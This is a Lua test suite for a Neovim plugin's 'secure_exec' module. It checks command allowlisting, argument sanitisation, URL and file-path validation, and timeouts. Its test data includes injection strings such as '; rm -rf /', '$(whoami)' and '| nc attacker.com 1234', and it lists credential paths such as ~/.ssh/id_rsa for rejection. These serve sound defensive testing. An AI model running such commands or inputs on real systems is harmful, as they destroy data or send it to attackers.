local runner = require('tests.test_runner')
local assert = runner.assert

-- Test suite for secure_exec
local suite = runner.describe("secure_exec")
local secure_exec = require('todo-ai.secure_exec')

-- Mock vim.fn.jobstart
local original_jobstart
local mock_job_results = {}

suite.before_each = function()
  original_jobstart = vim.fn.jobstart
  mock_job_results = {}

  vim.fn.jobstart = function(cmd, opts)
    -- Validate command format
    if type(cmd) ~= 'table' then
      error("Command must be array, not string")
    end

    -- Check for dangerous patterns
    for _, part in ipairs(cmd) do
      if part:match('[;&|]') and not (cmd[1] == 'sh' or cmd[1] == 'bash') then
        error("Potential command injection detected")
      end
    end

    -- Simulate job execution
    if opts.on_stdout then
      opts.on_stdout(1, mock_job_results.stdout or {""}, "stdout")
    end
    if opts.on_stderr and mock_job_results.stderr then
      opts.on_stderr(1, mock_job_results.stderr, "stderr")
    end
    if opts.on_exit then
      opts.on_exit(1, mock_job_results.exit_code or 0, "exit")
    end

    return 1  -- Job ID
  end
end

suite.after_each = function()
  vim.fn.jobstart = original_jobstart
end

-- Test: validate_command
runner.it(suite, "should validate safe commands", function()
  local valid, err = secure_exec.validate_command("ls")
  assert.truthy(valid, "Should allow ls")

  valid, err = secure_exec.validate_command("git")
  assert.truthy(valid, "Should allow git")

  valid, err = secure_exec.validate_command("curl")
  assert.truthy(valid, "Should allow curl")
end)

runner.it(suite, "should reject dangerous commands", function()
  local valid, err = secure_exec.validate_command("rm")
  assert.falsy(valid, "Should reject rm")

  valid, err = secure_exec.validate_command("sudo")
  assert.falsy(valid, "Should reject sudo")

  valid, err = secure_exec.validate_command("eval")
  assert.falsy(valid, "Should reject eval")
end)

-- Test: sanitize_args
runner.it(suite, "should sanitize command arguments", function()
  local args = {"-la", "../test", "file.txt"}
  local sanitized = secure_exec.sanitize_args(args)

  assert.deep_equals(sanitized, args, "Should keep safe args")
end)

runner.it(suite, "should remove command injection attempts", function()
  local args = {"; rm -rf /", "file.txt"}
  local sanitized = secure_exec.sanitize_args(args)

  assert.falsy(vim.tbl_contains(sanitized, "; rm -rf /"), "Should remove injection")
end)

runner.it(suite, "should handle special characters safely", function()
  local args = {"file with spaces.txt", "$(whoami)", "`date`"}
  local sanitized = secure_exec.sanitize_args(args)

  -- Should keep file with spaces
  assert.truthy(vim.tbl_contains(sanitized, "file with spaces.txt"))

  -- Should remove command substitutions
  local has_substitution = false
  for _, arg in ipairs(sanitized) do
    if arg:match('%$%(') or arg:match('`') then
      has_substitution = true
    end
  end
  assert.falsy(has_substitution, "Should remove command substitutions")
end)

-- Test: execute_safe
runner.it(suite, "should execute safe commands", function()
  local executed = false
  mock_job_results = {
    stdout = {"file1.txt", "file2.txt"},
    exit_code = 0
  }

  secure_exec.execute_safe("ls", {"-la"}, function(success, output, error)
    executed = true
    assert.truthy(success, "Should succeed")
    assert.truthy(output:match("file1.txt"), "Should return output")
    assert.is_nil(error, "Should have no error")
  end)

  -- Wait for async execution
  vim.wait(10)
  assert.truthy(executed, "Callback should be called")
end)

runner.it(suite, "should handle command failure", function()
  local executed = false
  mock_job_results = {
    stderr = {"ls: cannot access 'nonexistent': No such file or directory"},
    exit_code = 1
  }

  secure_exec.execute_safe("ls", {"nonexistent"}, function(success, output, error)
    executed = true
    assert.falsy(success, "Should fail")
    assert.not_nil(error, "Should have error")
  end)

  vim.wait(10)
  assert.truthy(executed, "Callback should be called")
end)

-- Test: curl_async with safety
runner.it(suite, "should build safe curl commands", function()
  local cmd_captured = nil

  vim.fn.jobstart = function(cmd, opts)
    cmd_captured = cmd
    if opts.on_exit then
      opts.on_exit(1, 0, "exit")
    end
    return 1
  end

  secure_exec.curl_async("https://api.example.com", {
    method = "POST",
    headers = {"Content-Type: application/json"},
    data = '{"key": "value"}'
  }, function() end)

  assert.not_nil(cmd_captured, "Should execute command")
  assert.type(cmd_captured, "table", "Should use array format")
  assert.equals(cmd_captured[1], "curl", "Should start with curl")
  assert.contains(cmd_captured, "-X", "Should include method")
  assert.contains(cmd_captured, "POST", "Should include POST")
end)

runner.it(suite, "should validate URLs", function()
  local valid_urls = {
    "https://api.example.com",
    "http://localhost:3000",
    "https://api.example.com/v1/endpoint"
  }

  for _, url in ipairs(valid_urls) do
    local valid = secure_exec.validate_url(url)
    assert.truthy(valid, "Should accept: " .. url)
  end

  local invalid_urls = {
    "file:///etc/passwd",
    "javascript:alert(1)",
    "../../../etc/passwd",
    "'; DROP TABLE users; --"
  }

  for _, url in ipairs(invalid_urls) do
    local valid = secure_exec.validate_url(url)
    assert.falsy(valid, "Should reject: " .. url)
  end
end)

-- Test: environment variable safety
runner.it(suite, "should handle environment variables safely", function()
  local old_env = vim.env.PATH
  vim.env.PATH = "/usr/bin:/bin"

  -- Should not execute with modified PATH
  local args = {"--version"}
  secure_exec.execute_safe("git", args, function(success, output, error)
    -- Check that PATH wasn't modified during execution
    assert.equals(vim.env.PATH, "/usr/bin:/bin")
  end)

  vim.env.PATH = old_env
end)

-- Test: timeout handling
runner.it(suite, "should respect command timeouts", function()
  local callback_result = nil

  -- Store original functions
  local original_timer = vim.fn.timer_start
  local original_jobstart = vim.fn.jobstart
  local original_jobstop = vim.fn.jobstop

  local timer_callback = nil
  local job_id = 999

  -- Mock jobstart to return a job ID but not complete
  vim.fn.jobstart = function(cmd, opts)
    -- Return a job ID but don't call exit callback (simulating long-running command)
    return job_id
  end

  -- Mock timer_start to capture the timeout callback
  vim.fn.timer_start = function(timeout, callback)
    if timeout == 5000 then
      timer_callback = callback
      -- Don't execute immediately - wait for jobstart to set job_id
    end
    return 1
  end

  -- Mock jobstop
  vim.fn.jobstop = function(j_id)
    -- Just return success
    return 0
  end

  -- Execute with timeout - this should timeout since job never completes
  secure_exec.execute_with_timeout("sleep", {"10"}, 5000, function(success, output, error)
    callback_result = {success = success, output = output, error = error}
  end)

  -- Now that jobstart has been called and job_id is set, trigger the timeout
  if timer_callback then
    timer_callback()
  end

  -- Let any deferred operations complete
  vim.wait(10)

  -- Restore
  vim.fn.timer_start = original_timer
  vim.fn.jobstart = original_jobstart
  vim.fn.jobstop = original_jobstop

  -- Verify timeout was handled
  assert.not_nil(callback_result, "Callback should have been called on timeout")
  assert.falsy(callback_result.success, "Should report failure on timeout")
  assert.not_nil(callback_result.error, "Should have error message")
  assert.truthy(callback_result.error:lower():match("timeout"), "Error should mention timeout")
end)

-- Test: safe file operations
runner.it(suite, "should validate file paths", function()
  local safe_paths = {
    "file.txt",
    "./src/module.lua",
    "docs/README.md"
  }

  for _, path in ipairs(safe_paths) do
    local valid = secure_exec.validate_file_path(path)
    assert.truthy(valid, "Should accept: " .. path)
  end

  local unsafe_paths = {
    "/etc/passwd",
    "../../../etc/passwd",
    "~/.ssh/id_rsa",
    "/root/.bashrc"
  }

  for _, path in ipairs(unsafe_paths) do
    local valid = secure_exec.validate_file_path(path)
    assert.falsy(valid, "Should reject: " .. path)
  end
end)

-- Test: command chaining prevention
runner.it(suite, "should prevent command chaining", function()
  local dangerous_args = {
    "file.txt; rm -rf /",
    "file.txt && curl evil.com",
    "file.txt || wget malware.com",
    "file.txt | nc attacker.com 1234"
  }

  for _, arg in ipairs(dangerous_args) do
    local sanitized = secure_exec.sanitize_args({arg})
    if #sanitized > 0 then
      assert.falsy(sanitized[1]:match('[;&|]'), "Should remove chaining from: " .. arg)
    end
  end
end)

-- Test: resource limits
runner.it(suite, "should enforce resource limits", function()
  -- Test memory limit enforcement
  local large_data = string.rep("x", 1024 * 1024 * 100)  -- 100MB

  assert.throws(function()
    secure_exec.validate_data_size(large_data)
  end, nil, "Should reject excessive data")
end)

return suite